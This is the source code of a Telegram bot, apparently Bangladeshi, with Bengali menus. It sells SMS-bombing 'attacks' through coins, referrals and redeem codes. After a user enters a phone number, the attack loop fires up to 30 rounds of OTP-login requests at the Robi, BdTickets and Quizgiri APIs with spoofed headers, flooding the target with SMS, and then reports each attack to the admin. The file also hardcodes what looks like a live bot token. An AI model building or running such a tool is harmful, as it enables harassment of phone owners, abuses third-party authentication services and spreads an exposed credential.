const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; 
const channelId = '@srmtelecom'; 
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস হ্যান্ডলিং
const dbFile = 'users.json';
const configFile = 'config.json';
if (!fs.existsSync(dbFile)) fs.writeFileSync(dbFile, JSON.stringify({}));
if (!fs.existsSync(configFile)) fs.writeFileSync(configFile, JSON.stringify({ redeemCode: null, reward: 0, limit: 0, usedBy: [] }));

let users = JSON.parse(fs.readFileSync(dbFile));
let config = JSON.parse(fs.readFileSync(configFile));

function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }
function saveConfig() { fs.writeFileSync(configFile, JSON.stringify(config, null, 2)); }

// Uptime সচল রাখতে Render সার্ভার
http.createServer((req, res) => { res.write("S.R.M Engine Live!"); res.end(); }).listen(process.env.PORT || 3000);

// ডাইনামিক মেনু
function getMenu(userId) {
    const isAdmin = (userId === adminId);
    let keyboard = [
        [{ text: '🚀 শুরু করুন (Attack)' }, { text: '👤 প্রোফাইল ও ব্যালেন্স' }],
        [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
        [{ text: '🎫 রিডিম কোড (Redeem)' }, { text: '📢 অফিশিয়াল চ্যানেল' }]
    ];
    if (isAdmin) keyboard.splice(2, 0, [{ text: '🧧 কয়েন গিফট (Admin Only)' }]);
    return { reply_markup: { keyboard: keyboard, resize_keyboard: true } };
}

async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();
    if (!text) return;

    // ইউজার রেজিস্ট্রেশন ও অ্যাডমিন ব্যালেন্স
    if (!users[userId]) {
        users[userId] = { 
            balance: (userId === adminId) ? 99999999999999 : 0, 
            lastBonus: 0, step: '', name: msg.from.first_name || "User", isBanned: false 
        };
        saveDB();
    }
    if (users[userId].isBanned) return bot.sendMessage(chatId, "🚫 ব্যান করা হয়েছে।");

    // অ্যাডমিন কমান্ডস (Broadcast, Give, SetCode, SetMyCoin)
    if (userId === adminId) {
        if (text.startsWith('broadcast ')) {
            const bMsg = text.replace('broadcast ', '');
            Object.keys(users).forEach(id => bot.sendMessage(id, `📢 **Update**\n\n${bMsg}`).catch(e=>{}));
            return bot.sendMessage(chatId, "✅ ব্রডকাস্ট সম্পন্ন।");
        }
        if (text.startsWith('setcode ')) {
            const [_, code, rew, lim] = text.split(' ');
            config.redeemCode = code; config.reward = parseInt(rew); config.limit = parseInt(lim); config.usedBy = [];
            saveConfig(); return bot.sendMessage(chatId, `✅ কোড ${code} সেট হয়েছে।`);
        }
        if (text === 'codeoff') { config.redeemCode = null; saveConfig(); return bot.sendMessage(chatId, "📴 কোড বন্ধ।"); }
        if (text.startsWith('setmycoin ')) { users[userId].balance = parseInt(text.split(' ')[1]); saveDB(); return bot.sendMessage(chatId, "✅ ব্যালেন্স আপডেট।"); }
    }

    // মেনু ও সার্ভিসেস
    if (text === '/start' || text.startsWith('/start')) {
        const joined = await isSubscribed(chatId);
        if (!joined) return bot.sendMessage(chatId, `❌ জয়েন করে /start দিন।\n${channelLink}`, { reply_markup: { inline_keyboard: [[{ text: '📢 জয়েন করুন', url: channelLink }]] } });
        
        // রেফার বোনাস
        if (text.startsWith('/start ') && text.split(' ')[1] !== userId && !users[userId].referredBy) {
            const rId = text.split(' ')[1];
            if (users[rId]) { users[rId].balance += 5; users[userId].referredBy = rId; saveDB(); bot.sendMessage(rId, "🎊 রেফার বোনাস +৫ কয়েন!"); }
        }
        return bot.sendMessage(chatId, `⚡ **S.R.M TELECOM**\n💰 ব্যালেন্স: **${users[userId].balance} Coins**`, getMenu(userId));
    }

    if (text === '👤 প্রোফাইল ও ব্যালেন্স') {
        return bot.sendMessage(chatId, `👤 নাম: ${users[userId].name}\n🆔 ID: \`${userId}\`\n💰 ব্যালেন্স: ${users[userId].balance} Coins`, { parse_mode: "Markdown" });
    }

    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        if (now - users[userId].lastBonus < 86400000) return bot.sendMessage(chatId, "⏳ ২৪ ঘণ্টা পর আবার ট্রাই করুন।");
        users[userId].balance += 2; users[userId].lastBonus = now; saveDB();
        return bot.sendMessage(chatId, "✅ ২ কয়েন বোনাস পেয়েছেন।");
    }

    if (text === '🔗 রেফার করুন') {
        const me = await bot.getMe();
        return bot.sendMessage(chatId, `🔗 রেফার লিংক:\nhttps://t.me/${me.username}?start=${userId}\n\nপ্রতি রেফারে পাবেন ৫ কয়েন!`);
    }

    // রিডিম ও গিফট লজিক
    if (text === '🎫 রিডিম কোড (Redeem)') {
        if (!config.redeemCode) return bot.sendMessage(chatId, "❌ কোড নেই।");
        users[userId].step = 'redeem_input'; saveDB();
        return bot.sendMessage(chatId, "🎫 কোডটি লিখুন:", { reply_markup: { remove_keyboard: true } });
    }
    if (users[userId]?.step === 'redeem_input') {
        if (text === config.redeemCode) {
            if (config.usedBy.includes(userId)) return bot.sendMessage(chatId, "❌ অলরেডি নিয়েছেন।", getMenu(userId));
            if (config.usedBy.length >= config.limit) return bot.sendMessage(chatId, "❌ লিমিট শেষ।", getMenu(userId));
            users[userId].balance += config.reward; config.usedBy.push(userId); users[userId].step = ''; saveDB(); saveConfig();
            return bot.sendMessage(chatId, `✅ ${config.reward} কয়েন পেয়েছেন।`, getMenu(userId));
        } else { users[userId].step = ''; saveDB(); return bot.sendMessage(chatId, "❌ ভুল কোড।", getMenu(userId)); }
    }

    if (text === '🧧 কয়েন গিফট (Admin Only)' && userId === adminId) {
        users[userId].step = 'gift_id'; saveDB();
        return bot.sendMessage(chatId, "🆔 ইউজারের ID দিন:", { reply_markup: { remove_keyboard: true } });
    }
    if (users[userId]?.step === 'gift_id' && userId === adminId) {
        if (!users[text]) return bot.sendMessage(chatId, "❌ ইউজার নেই।", getMenu(userId));
        users[userId].gift_to = text; users[userId].step = 'gift_amt'; saveDB();
        return bot.sendMessage(chatId, "🔢 কয়েন পরিমাণ?");
    }
    if (users[userId]?.step === 'gift_amt' && userId === adminId) {
        const amt = parseInt(text);
        const tId = users[userId].gift_to;
        users[tId].balance += amt; users[userId].step = ''; saveDB();
        bot.sendMessage(chatId, `✅ ${amt} কয়েন পাঠানো হয়েছে।`, getMenu(userId));
        bot.sendMessage(tId, `🎁 অ্যাডমিন আপনাকে ${amt} কয়েন দিয়েছেন।`);
        return;
    }

    // অ্যাটাক ইঞ্জিন (Robi, BdTickets, Quizgiri Fixed)
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) return bot.sendMessage(chatId, "❌ কয়েন নেই!");
        users[userId].step = 'num'; saveDB();
        return bot.sendMessage(chatId, "📱 নম্বর দিন:", { reply_markup: { remove_keyboard: true } });
    }
    if (users[userId]?.step === 'num' && text.length === 11) {
        users[userId].target = text; users[userId].step = 'amount'; saveDB();
        return bot.sendMessage(chatId, "🔢 কয়টি SMS? (১-৩০):");
    }
    if (users[userId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ ১-৩০ দিন।");
        const target = users[userId].target;
        if (userId !== adminId) users[userId].balance -= 1;
        users[userId].step = ''; saveDB();

        bot.sendMessage(chatId, `🚀 **${target}** অ্যাটাক শুরু...`, getMenu(userId));
        let success = 0; let fail = 0;

        for (let i = 0; i < amount; i++) {
            try { await axios.post('https://www.robi.com.bd/api/v1/user/otp-login/request', [{"msisdn": target}], { headers: { 'Accept': 'text/x-component', 'next-action': '7f059ca75e4421bcef70abad89cb5bb05cba717c30', 'X-Requested-With': 'mark.via.gp' }, timeout: 4000 }); success++; } catch (e) { fail++; }
            try { await axios.post('https://api.bdtickets.com:20100/v1/auth', { "createUserCheck": true, "phoneNumber": "+88" + target, "applicationChannel": "WEB_APP" }, { headers: { 'Content-Type': 'application/json;charset=UTF-8', 'X-Requested-With': 'mark.via.gp' }, timeout: 5000 }); success++; } catch (e) { fail++; }
            try { await axios.post('https://developer.quizgiri.xyz/api/v2.0/send-otp', { "country_code": "+88", "phone": target }, { headers: { 'Authorization': 'Bearer', 'Content-Type': 'application/json', 'X-Requested-With': 'mark.via.gp', 'Origin': 'https://app.quizgiri.com.bd', 'Referer': 'https://app.quizgiri.com.bd/' }, timeout: 5000 }); success++; } catch (e) { fail++; }
            await new Promise(r => setTimeout(r, 4500)); 
        }
        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল: ${success} | ব্যর্থ: ${fail}`, getMenu(userId));
        bot.sendMessage(adminId, `⚠️ **LOG:** ${users[userId].name} (\`${userId}\`) attacked ${target}\n✅ Success: ${success} | ❌ Fail: ${fail}`);
    }
});
